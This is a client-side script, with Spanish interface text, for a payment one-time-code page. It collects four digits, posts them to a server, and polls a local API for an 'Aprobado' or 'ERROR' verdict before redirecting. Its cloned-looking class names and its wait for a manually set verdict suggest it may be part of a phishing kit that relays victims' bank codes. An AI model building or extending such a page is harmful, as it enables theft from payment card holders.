<script>
  // Inicializar componentes
  const loader = new ShadowLoader({ message: 'Verificando código OTP...' });
  const modalError = new ModalError({ autoHide: true, autoHideDelay: 4000 });

  var inputs = [
    document.getElementById('codeInput01'),
    document.getElementById('codeInput02'),
    document.getElementById('codeInput03'),
    document.getElementById('codeInput04')
  ];
  var btn = document.getElementById('btnPagar');

  inputs.forEach(function(input, i) {
    input.addEventListener('input', function() {
      this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
      if (this.value.length === 1 && i < inputs.length - 1) {
        inputs[i + 1].focus();
      }
      checkComplete();
    });
    input.addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && this.value === '' && i > 0) {
        inputs[i - 1].focus();
      }
    });
  });

  function checkComplete() {
    var complete = inputs.every(function(inp) { return inp.value.length === 1; });
    if (complete) {
      btn.disabled = false;
      btn.classList.remove('Mui-disabled', 'RegistrationOTP_disabledButton__TUR8K');
      btn.setAttribute('tabindex', '0');
    } else {
      btn.disabled = true;
      btn.classList.add('Mui-disabled', 'RegistrationOTP_disabledButton__TUR8K');
      btn.setAttribute('tabindex', '-1');
    }
  }

  // Manejar clic en botón Pagar
  btn.addEventListener('click', async (e) => {
    e.preventDefault();

    try {
      const code = inputs.map(inp => inp.value).join('');

      loader.show();

      // Enviar código OTP al servidor
      const response = await PollingClient.postData('otp/verify', {
        code: code,
      });

      const sessionId = response.sessionId;

      // Iniciar polling
      const poller = new PollingClient({
        apiUrl: 'http://localhost:3000/api',
        pollingInterval: 2000,
        onSuccess: (data) => {
          loader.hide();

          if (data.response === 'Aprobado' || data.response.includes('Aprobado')) {
            // Redirigir a confirmación
            setTimeout(() => {
              window.location.href = 'confirmation_clean.html';
            }, 500);
          }
        },
        onError: (error) => {
          loader.hide();

          if (error.type === 'error' || error.response === 'ERROR' || error.response?.includes('ERROR')) {
            // Mostrar modal de error
            modalError.show('El código OTP es incorrecto. Intenta nuevamente.');
            // Limpiar inputs
            inputs.forEach(inp => inp.value = '');
            inputs[0].focus();
            checkComplete();
          } else if (error.type === 'timeout') {
            modalError.show('Tiempo de espera agotado. Intenta nuevamente.');
          }
        },
      });

      poller.startPolling(sessionId, 'otp');
    } catch (error) {
      loader.hide();
      console.error('[OTP ERROR]', error);
      modalError.show('Error al procesar tu código. Intenta de nuevo.');
    }
  });

  var seconds = 58;
  var countdownEl = document.getElementById('countdown');
  var timerLabel = document.getElementById('timerLabel');
  var interval = setInterval(function() {
    seconds--;
    var m = Math.floor(seconds / 60);
    var s = seconds % 60;
    countdownEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
    if (seconds <= 0) {
      clearInterval(interval);
      timerLabel.innerHTML = '<span style="color:#1B2132;font-weight:500;cursor:pointer;">Reenviar c\u00f3digo</span>';
    }
  }, 1000);

  // Deshabilitar botón inicialmente
  checkComplete();
</script>
